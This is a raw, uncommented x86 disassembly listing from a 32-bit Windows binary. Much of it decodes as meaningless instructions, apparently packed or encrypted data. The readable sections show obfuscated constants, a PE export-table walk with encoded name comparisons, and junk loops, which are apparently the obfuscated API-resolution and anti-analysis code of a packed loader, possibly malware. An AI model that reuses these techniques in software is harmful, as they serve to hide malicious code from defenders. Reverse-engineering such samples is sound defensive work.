  4078bd:	stc    
  4078be:	push   esi
  4078bf:	leave  
  4078c0:	push   cs
  4078c1:	imul   BYTE PTR es:[ecx+0x2]
  4078c5:	xchg   ebp,eax
  4078c6:	jno    0x407869
  4078c8:	jne    0x40787a
  4078ca:	xor    BYTE PTR [eax+0x43d0512e],ah
  4078d0:	cmp    BYTE PTR [ebx+edi*8-0x1ebe27aa],dh
  4078d7:	sbb    DWORD PTR [ebp-0xb],esp
  4078da:	and    al,0xca
  4078dd:	xchg   ecx,eax
  4078de:	lahf   
  4078df:	jb     0x40794d
  4078e1:	adc    edx,esi
  4078e3:	push   esp
  4078e4:	xor    eax,0x89fcb880
  4078e9:	rcl    DWORD PTR [ecx+0x3b],cl
  4078ec:	call   0x351:0x210cfd74
  4078f3:	pop    esp
  4078f4:	lds    esi,FWORD PTR [ecx+0x2a]
  4078f7:	fstp   TBYTE PTR [ebx+eax*4-0xa51d8cd]
  4078fe:	ins    DWORD PTR es:[edi],dx
  4078ff:	in     al,0x24
  407901:	inc    eax
  407902:	add    ebp,DWORD PTR ds:0xb9afad6a
  407908:	stos   BYTE PTR es:[edi],al
  407909:	cwde   
  40790a:	push   edx
  40790b:	adc    ecx,DWORD PTR [eax+0x59]
  40790e:	cwde   
  40790f:	mov    ds:0xfece426d,eax
  407914:	mov    WORD PTR [ebx-0x6f93b385],gs
  40791a:	sbb    DWORD PTR [esi],esi
  40791c:	mov    ds:0x9d273ce6,al
  407921:	hlt    
  407922:	pop    ecx
  407923:	mov    ecx,0xee34209e
  407928:	bound  ecx,QWORD PTR [edx]
  40792a:	pop    ecx
  40792b:	mov    WORD PTR [eax+0x7b],ds
  40792e:	popa   
  40792f:	cmp    eax,0xd0701184
  407934:	repz sbb eax,0xa19a6875
  40793a:	inc    eax
  40793b:	xlat   BYTE PTR ds:[ebx]
  40793c:	loope  0x407964
  40793e:	test   eax,0x9c3e41c1
  407943:	jae    0x4079aa
  407945:	retf   
  407946:	xchg   DWORD PTR [edi-0x62d769fe],ecx
  40794c:	pop    edx
  40794d:	mov    bl,0x18
  40794f:	out    dx,al
  407950:	rol    dl,1
  407952:	jle    0x4079c5
  407954:	mov    esp,0xa979f98c
  407959:	push   esi
  40795a:	mov    ah,0x75
  40795c:	cmp    ebx,DWORD PTR ds:0xb4499ce8
  407962:	sbb    DWORD PTR [ebp+0x3d],edi
  407965:	(bad)  
  407966:	pop    ebp
  407967:	adc    al,BYTE PTR [ebx-0x56d4ba82]
  40796d:	or     ch,BYTE PTR [ecx]
  40796f:	jnp    0x40793f
  407971:	or     dl,cl
  407973:	fcomp  QWORD PTR ds:0xd8a12c53
  407979:	cmp    esi,DWORD PTR [ebp-0x5134565c]
  40797f:	adc    bl,BYTE PTR [edx]
  407981:	jnp    0x4079e6
  407983:	(bad)  
  407984:	test   al,0x6c
  407986:	xor    BYTE PTR [eax+edi*8+0x2d],dh
  40798a:	xlat   BYTE PTR ds:[ebx]
  40798b:	sbb    BYTE PTR [ebp-0x16],dh
  40798e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40798f:	and    eax,0x98db8dd9
  407994:	pop    ecx
  407995:	sub    al,0xde
  407997:	cmp    DWORD PTR [edi-0x20],esi
  40799a:	in     al,0xd6
  40799c:	data16 xor BYTE PTR [edi-0x7892df63],dh
  4079a3:	push   0x31
  4079a5:	pop    ecx
  4079a6:	inc    ebp
  4079a7:	dec    ecx
  4079a8:	addr16 push 0xffffff8b
  4079ab:	cmp    ebx,ebp
  4079ad:	lahf   
  4079ae:	(bad)  
  4079af:	cli    
  4079b0:	test   al,0xeb
  4079b2:	add    dh,BYTE PTR [eax-0x15a390d3]
  4079b8:	pusha  
  4079b9:	fdivr  DWORD PTR [ecx]
  4079bb:	stc    
  4079bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079bd:	mov    ebx,eax
  4079bf:	loop   0x407a35
  4079c1:	add    ch,cl
  4079c3:	mov    dl,0xe1
  4079c5:	pusha  
  4079c6:	dec    ebx
  4079c7:	push   es
  4079c8:	inc    ebp
  4079c9:	out    0x8e,eax
  4079cb:	jg     0x40794e
  4079cd:	test   BYTE PTR [edi+0x3a],dl
  4079d0:	loope  0x4079e9
  4079d2:	mov    ch,0x53
  4079d4:	out    dx,al
  4079d5:	pop    ds
  4079d6:	inc    ecx
  4079d7:	adc    al,cl
  4079d9:	push   ecx
  4079da:	pop    esi
  4079db:	hlt    
  4079dc:	pop    edx
  4079dd:	lods   al,BYTE PTR ds:[esi]
  4079de:	rol    edi,cl
  4079e0:	daa    
  4079e1:	sub    cl,BYTE PTR [eax+ebp*4-0x7b979701]
  4079e8:	mov    bh,0x4c
  4079ea:	inc    ecx
  4079eb:	out    0x13,al
  4079ed:	adc    eax,0x40d6f802
  4079f2:	adc    al,0xff
  4079f4:	pop    esp
  4079f5:	call   DWORD PTR [edi+0x304f90c6]
  4079fb:	or     eax,0x53f04f75
  407a00:	aad    0x92
  407a02:	xor    BYTE PTR [edx+eiz*8-0x2c65ec19],ch
  407a09:	loope  0x407a0e
  407a0b:	mov    eax,ds:0xfc00c6a1
  407a10:	clc    
  407a11:	mov    esp,0x50c58ade
  407a16:	sub    al,0x18
  407a18:	adc    ebp,DWORD PTR [eax+0x64]
  407a1b:	mov    WORD PTR [edi+0x6b],ds
  407a1e:	sbb    eax,0xce7a441f
  407a23:	shl    DWORD PTR [ecx-0x6c],1
  407a26:	neg    bl
  407a28:	test   al,0x13
  407a2a:	push   esp
  407a2b:	and    DWORD PTR [edi],edi
  407a2d:	push   cs
  407a2e:	and    BYTE PTR [ebx+0xe],bh
  407a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a32:	rcl    ah,cl
  407a34:	cdq    
  407a35:	sbb    eax,0xd3bb97c9
  407a3a:	pop    ecx
  407a3b:	pop    edi
  407a3c:	shl    DWORD PTR [edx+0x41],cl
  407a3f:	out    dx,al
  407a40:	int3   
  407a41:	or     al,0xba
  407a43:	cli    
  407a44:	repz test DWORD PTR [edi-0x73],esp
  407a48:	shl    BYTE PTR [edx+0xa],cl
  407a4b:	mov    ch,0xb7
  407a4d:	fadd   DWORD PTR [edi+0x27]
  407a50:	mov    bh,0x17
  407a52:	test   ebx,edx
  407a54:	jmp    0xadfb:0x8307d351
  407a5b:	pop    es
  407a5c:	xor    al,0x61
  407a5e:	or     DWORD PTR [edx],ebp
  407a60:	inc    ebp
  407a61:	mov    ?,WORD PTR [esi-0x6]
  407a64:	lods   al,BYTE PTR ds:[esi]
  407a65:	or     cl,BYTE PTR [ebx-0x11]
  407a68:	out    dx,eax
  407a69:	push   es
  407a6a:	ficom  WORD PTR ds:0x2abb3d0a
  407a70:	mov    edi,0x937d8763
  407a75:	lea    ecx,[eax]
  407a77:	out    0xd7,al
  407a79:	les    ecx,FWORD PTR [esp+ecx*1-0x416db521]
  407a80:	sbb    edi,DWORD PTR [edi-0x4b]
  407a83:	retf   
  407a84:	loope  0x407afe
  407a86:	in     eax,0x77
  407a88:	ret    
  407a89:	sbb    al,0x1f
  407a8b:	push   ds
  407a8c:	aad    0xf4
  407a8e:	jmp    0x42c6:0xad0416ee
  407a95:	cmp    al,0x7d
  407a97:	jmp    0x407a30
  407a99:	stos   BYTE PTR es:[edi],al
  407a9a:	pop    edx
  407a9b:	mov    cl,0xa4
  407a9d:	push   0x455e3f2a
  407aa2:	or     BYTE PTR [ebp-0x287ad3cb],ah
  407aa8:	dec    edx
  407aa9:	xchg   edx,eax
  407aaa:	pop    edi
  407aab:	pop    esp
  407aac:	dec    ecx
  407aad:	in     al,dx
  407aae:	nop
  407aaf:	dec    ecx
  407ab0:	(bad)  
  407ab1:	test   eax,0xd6d0c6c9
  407ab6:	in     al,0x88
  407ab8:	adc    eax,0x786e092e
  407abd:	ss pop ebx
  407abf:	call   0x5c1f:0xc001ec2
  407ac6:	jb     0x407aa9
  407ac8:	das    
  407ac9:	repz mov eax,0xba2c6517
  407acf:	jmp    0xe4fce70f
  407ad4:	adc    edi,ebx
  407ad6:	inc    ebx
  407ad7:	adc    eax,0x8e638999
  407adc:	mov    ah,0xdc
  407ade:	imul   esi,esp,0x1acd831e
  407ae4:	jb     0x407a7b
  407ae6:	cld    
  407ae7:	out    dx,al
  407ae8:	push   0x1191dc59
  407aed:	stos   BYTE PTR es:[edi],al
  407aee:	(bad)  
  407aef:	js     0x407acf
  407af1:	pop    edx
  407af2:	push   es
  407af3:	dec    eax
  407af4:	scas   eax,DWORD PTR es:[edi]
  407af5:	jge    0x407b63
  407af7:	setge  BYTE PTR [eax-0x4e]
  407afb:	out    0x80,al
  407afd:	jl     0x407b5c
  407aff:	dec    eax
  407b00:	mov    dh,0x64
  407b02:	pop    ebx
  407b03:	xchg   esp,eax
  407b04:	and    al,0xc8
  407b06:	sbb    bl,BYTE PTR [edi]
  407b08:	pop    ss
  407b09:	bound  ebp,QWORD PTR [ebp+0xf]
  407b0c:	shl    DWORD PTR [edi-0x56],0x91
  407b10:	fist   WORD PTR ds:[ebx+0x3c]
  407b14:	jae    0x407aa1
  407b16:	mov    al,ds:0x7179399d
  407b1b:	aaa    
  407b1c:	(bad)  
  407b1d:	inc    esi
  407b1e:	or     bh,al
  407b20:	int3   
  407b21:	call   0x5f4908a3
  407b26:	xchg   ecx,eax
  407b27:	sbb    BYTE PTR [edx+0x3],cl
  407b2a:	push   cs
  407b2b:	mov    eax,DWORD PTR [eax+0x799d978f]
  407b31:	cdq    
  407b32:	mov    esp,0xf981c0be
  407b37:	pop    es
  407b38:	aaa    
  407b39:	sbb    eax,0x334bbecc
  407b3e:	stc    
  407b3f:	add    edi,0x3272db
  407b45:	not    edi
  407b47:	and    eax,edi
  407b49:	movsx  di,BYTE PTR [eax+0x1]
  407b4e:	mov    ebx,0x3b4a
  407b53:	sub    di,bx
  407b56:	mov    ebx,0x8a87
  407b5b:	xor    di,bx
  407b5e:	mov    ebx,0x4f97
  407b63:	cmp    di,bx
  407b66:	jne    0x407b8e
  407b6c:	movsx  di,BYTE PTR [eax]
  407b70:	mov    ebx,0x3b4a
  407b75:	sub    di,bx
  407b78:	mov    ebx,0x8a87
  407b7d:	xor    di,bx
  407b80:	mov    ebx,0x4f84
  407b85:	cmp    di,bx
  407b88:	je     0x407b9e
  407b8e:	mov    edi,DWORD PTR [ebp-0x10]
  407b91:	xor    edi,ecx
  407b93:	mov    ebx,esi
  407b95:	sub    ebx,edi
  407b97:	add    eax,ebx
  407b99:	jmp    0x407b49
  407b9e:	mov    esi,DWORD PTR [ebp-0x14]
  407ba1:	mov    esi,DWORD PTR [esi]
  407ba3:	mov    edi,DWORD PTR [eax+0x3c]
  407ba6:	lea    esi,[edi+esi*8+0x78]
  407baa:	mov    esi,DWORD PTR [esi+eax*1]
  407bad:	mov    DWORD PTR [ebp-0x8],esi
  407bb0:	mov    esi,DWORD PTR [ebp+0x8]
  407bb3:	xor    esi,ecx
  407bb5:	add    esi,edx
  407bb7:	mov    DWORD PTR [ebp-0x14],esi
  407bba:	mov    esi,DWORD PTR [ebp+0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x8]
  407bc0:	xor    esi,ecx
  407bc2:	add    esi,edx
  407bc4:	pop    ebx
  407bc5:	cmp    edi,esi
  407bc7:	jne    0x407be5
  407bcd:	mov    eax,DWORD PTR [ebp+0xc]
  407bd0:	xor    eax,ecx
  407bd2:	mov    ecx,DWORD PTR [ebp-0x8]
  407bd5:	add    eax,edx
  407bd7:	imul   eax,ecx
  407bda:	mov    DWORD PTR [ebp-0x8],eax
  407bdd:	push   DWORD PTR [ebp+0x18]
  407be0:	jmp    0x407c39
  407be5:	mov    ecx,DWORD PTR [ebp-0x8]
  407be8:	add    ecx,eax
  407bea:	mov    DWORD PTR [ebp-0x14],ecx
  407bed:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf0:	mov    ecx,DWORD PTR [ecx+0xc]
  407bf3:	movsx  cx,BYTE PTR [ecx+eax*1]
  407bf8:	mov    edx,0x3b4a
  407bfd:	sub    cx,dx
  407c00:	mov    edx,0x8a87
  407c05:	xor    cx,dx
  407c08:	mov    edx,0x4f86
  407c0d:	cmp    cx,dx
  407c10:	jne    0x407bdd
  407c16:	mov    ecx,DWORD PTR ds:0x4163b4
  407c1c:	mov    ecx,DWORD PTR [ecx+0x198]
  407c22:	mov    DWORD PTR [ecx],eax
  407c24:	jmp    0x407c4a
  407c29:	mov    ecx,DWORD PTR [ebp+0x18]
  407c2c:	cmp    ecx,0xf89c85b1
  407c32:	jne    0x407c4a
  407c38:	push   eax
  407c39:	push   DWORD PTR [ebp+0x14]
  407c3c:	push   DWORD PTR [ebp+0x10]
  407c3f:	push   DWORD PTR [ebp+0xc]
  407c42:	push   DWORD PTR [ebp+0x8]
  407c45:	call   0x405399
  407c4a:	pop    edi
  407c4b:	pop    esi
  407c4c:	leave  
  407c4d:	ret    0x14
  407c50:	push   ebp
  407c51:	mov    ebp,esp
  407c53:	push   ecx
  407c54:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  407c5b:	and    DWORD PTR ds:0x413c02,0x414004
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    edx,DWORD PTR [ebp+0x10]
  407c6b:	mov    ecx,0x7510894
  407c70:	xor    eax,ecx
  407c72:	add    eax,0x3272dc
  407c77:	mov    DWORD PTR [edx],eax
  407c79:	movzx  edx,WORD PTR ds:0x413c7c
  407c80:	and    edx,DWORD PTR ds:0x413cf4
  407c86:	mov    DWORD PTR ds:0x413c7c,edx
  407c8c:	mov    eax,DWORD PTR [ebp+0xc]
  407c8f:	sbb    DWORD PTR ds:0x413c02,0x413c0a
  407c99:	xor    eax,ecx
  407c9b:	adc    edx,DWORD PTR ds:0x414010
  407ca1:	push   esi
  407ca2:	sub    edx,DWORD PTR ds:0x413c84
  407ca8:	mov    esi,DWORD PTR [ebp+0x10]
  407cab:	movzx  edx,WORD PTR ds:0x414010
  407cb2:	sbb    DWORD PTR ds:0x413cf4,edx
  407cb8:	mov    edx,0x3272dc
  407cbd:	neg    DWORD PTR ds:0x413d20
  407cc3:	add    eax,edx
  407cc5:	xor    DWORD PTR ds:0x413c06,0x413c1a
  407ccf:	mov    DWORD PTR [esi+0x4],eax
  407cd2:	mov    eax,DWORD PTR [ebp+0x14]
  407cd5:	mov    esi,DWORD PTR [ebp+0x10]
  407cd8:	mov    DWORD PTR [esi+0x8],eax
  407cdb:	mov    eax,DWORD PTR [ebp+0x18]
  407cde:	mov    esi,DWORD PTR [ebp+0x10]
  407ce1:	mov    DWORD PTR [esi+0xc],eax
  407ce4:	mov    eax,DWORD PTR [ebp+0x1c]
  407ce7:	mov    esi,DWORD PTR [ebp+0x10]
  407cea:	mov    DWORD PTR [esi+0x10],eax
  407ced:	mov    eax,DWORD PTR [ebp+0x8]
  407cf0:	xor    eax,ecx
  407cf2:	add    eax,edx
  407cf4:	pop    esi
  407cf5:	leave  
  407cf6:	ret    0x18
  407cf9:	push   ebp
  407cfa:	mov    ebp,esp
  407cfc:	push   ecx
  407cfd:	and    DWORD PTR ds:0x413d34,0x0
  407d07:	xor    eax,eax
  407d09:	add    eax,DWORD PTR ds:0x413d34
  407d0f:	inc    eax
  407d10:	mov    ds:0x413d34,eax
  407d15:	cmp    DWORD PTR ds:0x413d34,0x10
  407d1c:	jne    0x407d30
  407d22:	push   DWORD PTR [ebp-0x14]
  407d25:	push   0x4160bf
  407d2a:	call   DWORD PTR ds:0x41678c
  407d30:	cmp    DWORD PTR ds:0x413d34,0xf
  407d37:	jne    0x407d48
  407d3d:	mov    eax,ds:0x413d34
  407d42:	inc    eax
  407d43:	mov    ds:0x413d34,eax
  407d48:	cmp    DWORD PTR ds:0x413d34,0x1e
  407d4f:	jb     0x407d07
  407d55:	sbb    eax,DWORD PTR ds:0x413bf6
  407d5b:	push   ecx
  407d5c:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  407d63:	and    DWORD PTR ds:0x413c06,0x0
  407d6d:	jmp    0x407d7f
  407d72:	mov    edx,DWORD PTR ds:0x413c06
  407d78:	inc    edx
  407d79:	mov    DWORD PTR ds:0x413c06,edx
  407d7f:	cmp    DWORD PTR ds:0x413c06,0x1d
  407d86:	jae    0x407dc8
  407d8c:	cmp    DWORD PTR ds:0x413c06,0x27
  407d93:	jne    0x407dbd
  407d99:	push   0x1c64
  407d9e:	push   0x413c06
  407da3:	push   0x752e
  407da8:	push   0x4160cf
  407dad:	push   0x55a9
  407db2:	push   0x2dee
  407db7:	call   DWORD PTR ds:0x416790
  407dbd:	jmp    0x407d72
  407dc2:	and    eax,DWORD PTR ds:0x413ce0
  407dc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  407dcf:	mov    DWORD PTR ds:0x413d34,0x14
  407dd9:	cmp    DWORD PTR ds:0x413d34,0x0
  407de0:	je     0x407e29
  407de6:	cmp    DWORD PTR ds:0x413d34,0x9
  407ded:	jne    0x407dfe
  407df3:	push   0x2bdc
  407df8:	call   DWORD PTR ds:0x416798
  407dfe:	cmp    DWORD PTR ds:0x413d34,0xa
  407e05:	jne    0x407e19
  407e0b:	xor    eax,eax
  407e0d:	add    eax,DWORD PTR ds:0x413d34
  407e13:	dec    eax
  407e14:	mov    ds:0x413d34,eax
  407e19:	mov    eax,ds:0x413d34
  407e1e:	dec    eax
  407e1f:	mov    ds:0x413d34,eax
  407e24:	jmp    0x407dd9
  407e29:	mov    eax,DWORD PTR [ebp-0x4]
  407e2c:	push   esi
  407e2d:	mov    esi,DWORD PTR [ebp-0x8]
  407e30:	mov    edx,0x7510894
  407e35:	xor    eax,edx
  407e37:	xor    esi,edx
  407e39:	mov    ecx,0x3272dc
  407e3e:	add    esi,ecx
  407e40:	add    eax,ecx
  407e42:	imul   eax,esi
  407e45:	mov    esi,DWORD PTR [ebp+0xc]
  407e48:	jmp    0x40a1fd
  407e4d:	mov    ds:0x72fcde4e,al
  407e52:	in     al,dx
  407e53:	xor    dl,0xf9
  407e56:	mov    ebp,0x828e70e0
  407e5b:	stos   DWORD PTR es:[edi],eax
  407e5c:	jle    0x407e2d
  407e5e:	and    bh,BYTE PTR [esp+edi*2-0x2c]
  407e62:	pop    edi
  407e63:	jl     0x407ee1
  407e65:	retf   
  407e66:	icebp  
  407e67:	das    
  407e68:	std    
  407e69:	mov    cl,0xe4
  407e6b:	popf   
  407e6c:	outs   dx,DWORD PTR ds:[esi]
  407e6d:	jmp    0xfc40f724
  407e72:	jno    0x407e48
  407e74:	aas    
  407e75:	lea    esi,[eax]
  407e77:	pusha  
  407e78:	cmp    dl,bl
  407e7a:	dec    eax
  407e7b:	in     eax,0xd9
  407e7d:	xor    dl,cl
  407e7f:	aaa    
  407e80:	fxch   st(6)
  407e82:	pop    ds
  407e83:	xchg   ebx,eax
  407e84:	mov    ah,0x26
  407e86:	push   ss
  407e87:	mov    dh,0x25
  407e89:	xlat   BYTE PTR ds:[ebx]
  407e8a:	pop    ecx
  407e8b:	clc    
  407e8c:	retf   
  407e8d:	cmp    al,0xce
  407e8f:	out    0x4b,eax
  407e91:	sub    BYTE PTR [ebx],ah
  407e93:	ror    DWORD PTR [esi],0x97
  407e96:	inc    ecx
  407e97:	cmp    DWORD PTR [ebp+0xb2d0c69],ebx
  407e9d:	mov    ds,WORD PTR [ebx+edi*8-0x48]
  407ea1:	stc    
  407ea2:	push   esp
  407ea3:	ret    
  407ea4:	aaa    
  407ea5:	stos   DWORD PTR es:[edi],eax
  407ea6:	repz or eax,0x3d40cc02
  407eac:	mov    ah,0x32
  407eae:	jns    0x407f2a
  407eb0:	sbb    eax,0x29b3c936
  407eb5:	jl     0x407ed2
  407eb7:	adc    DWORD PTR [ebp-0x11],ebp
  407eba:	ins    DWORD PTR es:[edi],dx
  407ebb:	push   esi
  407ebc:	sahf   
  407ebd:	mov    ds:0x86cd497c,al
  407ec2:	inc    esp
  407ec3:	cwde   
  407ec4:	cwde   
  407ec5:	cmp    eax,0xcfa36896
  407eca:	pop    edi
  407ecb:	jb     0x407eb0
  407ecd:	inc    edi
  407ece:	xor    BYTE PTR [esi-0x3cc9351c],cl
  407ed4:	inc    ecx
  407ed5:	ins    BYTE PTR es:[edi],dx
  407ed6:	lock mov ds:0x256ff08,al
  407edc:	dec    esi
  407edd:	rol    DWORD PTR [eax],0xaf
  407ee0:	in     eax,0x8
  407ee2:	push   0x25
  407ee4:	mov    ds:0x360db699,eax
  407ee9:	test   BYTE PTR [edi+ebp*1+0x63],bl
  407eed:	push   edx
  407eee:	add    edi,DWORD PTR [esi-0x23]
  407ef1:	stos   DWORD PTR es:[edi],eax
  407ef2:	stc    
  407ef3:	cwde   
  407ef4:	in     al,0x3e
  407ef6:	mov    edi,0x3daec8e9
  407efb:	rcr    BYTE PTR [esi-0x66],cl
  407efe:	mov    edi,0x73716234
  407f03:	in     eax,dx
  407f04:	test   eax,0xa12cd370
  407f09:	push   0xffffffe9
  407f0b:	fistp  DWORD PTR [esi]
  407f0d:	loop   0x407e99
  407f0f:	and    BYTE PTR [ecx+0x7],cl
  407f12:	inc    ebx
  407f13:	rcr    BYTE PTR [ecx+edx*4+0x17e1332],1
  407f1a:	inc    eax
  407f1b:	test   DWORD PTR ds:0x4cd646c7,edx
  407f21:	and    al,0x4
  407f23:	mov    ebx,0xb68ee3c9
  407f28:	sbb    eax,0x1d57b696
  407f2d:	mov    al,0xef
  407f2f:	arpl   si,sp
  407f31:	retw   0x192a
  407f35:	dec    esi
  407f36:	je     0x407f50
  407f38:	mov    edx,0x53b6950b
  407f3d:	pop    ebp
  407f3e:	or     DWORD PTR [ebp+0x69],ecx
  407f41:	fwait
  407f42:	push   ebx
  407f43:	in     al,0xd6
  407f45:	add    DWORD PTR [edi],0x35
  407f48:	stc    
  407f49:	pop    esi
  407f4a:	test   BYTE PTR [edi],0x3f
  407f4d:	into   
  407f4e:	into   
  407f4f:	hlt    
  407f50:	xchg   ebp,eax
  407f51:	xchg   esp,eax
  407f52:	mov    dl,0x77
  407f54:	(bad)  
  407f55:	std    
  407f56:	xor    esi,eax
  407f58:	inc    ecx
  407f59:	and    DWORD PTR [esi+0x39bd9374],ebx
  407f5f:	clc    
  407f60:	aad    0xa5
  407f62:	cs push ebp
  407f64:	fnstcw WORD PTR [ebx+0x6a]
  407f67:	add    DWORD PTR [edi-0x4e508f71],ecx
  407f6d:	cmc    
  407f6e:	cmp    BYTE PTR [edi],cl
  407f70:	scas   al,BYTE PTR es:[edi]
  407f71:	pop    edi
  407f72:	mov    ebx,0x34a14fe0
  407f77:	inc    ebx
  407f78:	mov    edx,0xf4016a59
  407f7d:	in     eax,0xe6
  407f7f:	in     eax,dx
  407f80:	cmp    ch,BYTE PTR [ebx]
  407f82:	cmc    
  407f83:	scas   al,BYTE PTR es:[edi]
  407f84:	xchg   BYTE PTR [eiz*8-0x8596990],bh
  407f8b:	pop    ds
  407f8c:	adc    al,0x93
  407f8e:	inc    ecx
  407f8f:	adc    DWORD PTR [esi],eax
  407f91:	into   
  407f92:	adc    eax,DWORD PTR gs:[edi+0x9]
  407f96:	xchg   ecx,eax
  407f97:	(bad)  [edx-0x66e30ee]
  407f9d:	jge    0x407fc1
  407f9f:	lock jecxz 0x407fed
  407fa2:	jmp    0x408017
  407fa4:	lahf   
  407fa5:	loopne 0x407f4a
  407fa7:	jmp    0x407fd4
  407fa9:	sbb    edi,DWORD PTR [ebx+esi*2]
  407fac:	pop    eax
  407fad:	cdq    
  407fae:	pop    ecx
  407faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fb0:	or     dh,BYTE PTR [esi-0x24]
  407fb3:	push   cs
  407fb4:	cmp    BYTE PTR [edi-0x43],bl
  407fb7:	call   0x3ca3:0xb316ba54
  407fbe:	outs   dx,BYTE PTR ds:[esi]
  407fbf:	rcr    BYTE PTR [edx],1
  407fc1:	test   eax,0x2f7ddd17
  407fc6:	inc    ecx
  407fc7:	dec    ecx
  407fc8:	mov    ebp,0x783b6c03
  407fcd:	aam    0x1a
  407fcf:	sub    al,0x6
  407fd1:	lods   al,BYTE PTR ds:[esi]
  407fd2:	mov    esp,0x7226624
  407fd7:	mov    esp,0x19bcd211
  407fdc:	pop    ds
  407fdd:	inc    eax
  407fde:	jmp    0x407f7b
  407fe0:	sub    ebp,DWORD PTR [ebp+0x66]
  407fe3:	jmp    0x407f78
  407fe5:	mov    bl,BYTE PTR [ecx-0x12]
  407fe8:	sbb    esp,DWORD PTR [eax]
  407fea:	sub    BYTE PTR [ecx+0xaaa3066],0x56
  407ff1:	fadd   st,st(6)
  407ff3:	jae    0x407fa6
  407ff5:	cmp    al,BYTE PTR [esi+0x45]
  407ff8:	cwde   
  407ff9:	adc    BYTE PTR [esi+0x2f],bl
  407ffc:	jl     0x407fcc
  407ffe:	mov    DWORD PTR [ebp+ebx*1-0x4f],edi
  408002:	pop    ecx
  408003:	leave  
  408004:	test   DWORD PTR [ebx+0x3a],esi
  408007:	mov    ah,0xc1
  408009:	mov    edx,0xb21936a
  40800e:	(bad)  
  40800f:	or     DWORD PTR [esi-0x23c5f9b0],edx
  408015:	outs   dx,DWORD PTR ds:[esi]
  408016:	pop    eax
  408017:	call   0xe9b5:0xfa16cb12
  40801e:	leave  
  40801f:	push   eax
  408020:	je     0x40801e
  408022:	rcr    DWORD PTR [ebx],cl
  408024:	xchg   esp,eax
  408025:	es sbb ebx,eax
  408028:	es sbb eax,0xf66f7b10
  40802f:	nop
  408030:	xchg   ebp,eax
  408031:	xchg   ebp,eax
  408032:	xchg   ecx,edi
  408034:	xor    edx,ebp
  408036:	arpl   WORD PTR [edi+0x42],di
  408039:	stc    
  40803a:	xchg   edx,eax
  40803b:	dec    esp
  40803c:	pop    ds
  40803d:	and    ebp,DWORD PTR [ecx-0x7fd59e62]
  408043:	test   BYTE PTR [ebp+eiz*1-0x3f9f88e3],ah
  40804a:	mov    dh,0x5e
  40804c:	add    eax,0x6a40246e
  408051:	jmp    0x40805a
  408053:	cs xchg ecx,eax
  408055:	sbb    bh,ah
  408057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408058:	retf   
  408059:	cmp    al,BYTE PTR [ebx]
  40805b:	gs cli 
  40805d:	jno    0x408030
  40805f:	iret   
  408060:	shl    DWORD PTR [edi+0x65],cl
  408063:	stos   BYTE PTR es:[edi],al
  408064:	mov    eax,ds:0xceb1d53f
  408069:	sbb    esi,DWORD PTR [ecx+0x555eadfb]
  40806f:	mov    al,ds:0x4158ba66
  408074:	push   es
  408075:	jb     0x40802c
  408077:	mov    ch,0x37
  408079:	fs das 
  40807b:	sub    bl,BYTE PTR [edi]
  40807d:	sbb    DWORD PTR [edi+0x34],ebx
  408080:	cmp    ah,BYTE PTR [ecx+eax*2]
  408083:	aas    
  408084:	(bad)  
  408085:	(bad)  
  408086:	sti    
  408087:	out    0x9a,al
  408089:	ja     0x408048
  40808b:	ror    BYTE PTR [ebx+esi*2],cl
  40808e:	neg    DWORD PTR [esi+0x6a1d84b8]
  408094:	cwde   
  408095:	div    bl
  408097:	pusha  
  408098:	xchg   esp,eax
  408099:	mov    dh,0x11
  40809b:	jae    0x4080b6
  40809d:	and    eax,0xaa8c9cc1
  4080a2:	mov    esi,0xd459411a
  4080a7:	ds (bad) 
  4080a9:	mov    BYTE PTR [edi+0x35],ah
  4080ac:	int3   
  4080ad:	push   ds
  4080ae:	cmp    ah,BYTE PTR [esi]
  4080b0:	or     BYTE PTR fs:[eax],al
  4080b3:	sbb    esp,esi
  4080b5:	stc    
  4080b6:	fiadd  DWORD PTR [ecx+0x45]
  4080b9:	ror    BYTE PTR [ebx+0xa],1
  4080bc:	scas   eax,DWORD PTR es:[edi]
  4080bd:	inc    ecx
  4080be:	sub    BYTE PTR [ebp+0x6b],bl
  4080c1:	mov    dl,0xe8
  4080c3:	cmp    DWORD PTR [esi],ebp
  4080c5:	xor    ah,al
  4080c7:	stos   DWORD PTR es:[edi],eax
  4080c8:	mov    es,WORD PTR [ebx+0x1be8be7e]
  4080ce:	in     al,0x4d
  4080d0:	jl     0x40806a
  4080d2:	pop    ecx
  4080d3:	cmp    BYTE PTR [edi-0x3a],0x11
  4080d7:	mov    edi,0xbe98a10e
  4080dc:	xchg   edx,eax
  4080dd:	pop    ss
  4080de:	sar    esp,cl
  4080e0:	mov    edi,0xaeb53251
  4080e5:	and    dh,dl
  4080e7:	pop    eax
  4080e8:	cmc    
  4080e9:	inc    ebx
  4080ea:	stos   BYTE PTR es:[edi],al
  4080eb:	gs push ecx
  4080ed:	mov    edi,0x75992183
  4080f2:	lahf   
  4080f3:	sub    cl,BYTE PTR [edi-0x27]
  4080f6:	adc    ebp,DWORD PTR [ebp-0x35a26392]
  4080fc:	adc    al,BYTE PTR [ebp+0x75]
  4080ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408100:	rsqrtps xmm1,XMMWORD PTR [edi]
  408103:	in     al,0x86
  408105:	sub    ah,BYTE PTR [edx-0x8]
  408108:	dec    DWORD PTR [edi+0x6d9eb0f9]
  40810e:	adc    ch,dl
  408110:	adc    eax,0xfe6bade0
  408115:	sbb    ebp,esi
  408117:	jmp    0xfe0a:0x6973323
  40811e:	out    dx,al
  40811f:	sub    eax,DWORD PTR [ebx-0x3d]
  408122:	sbb    al,0x2f
  408124:	xchg   DWORD PTR [ebx],ecx
  408126:	pusha  
  408127:	(bad)  
  408128:	imul   eax,DWORD PTR [ecx+0x58cada46],0x6e649809
  408132:	xchg   ebx,eax
  408133:	pcmpgtb mm0,QWORD PTR [edi]
  408136:	jge    0x4080bb
  408138:	rcr    BYTE PTR [esi+0x37b9d9ea],0xf
  40813f:	jns    0x408194
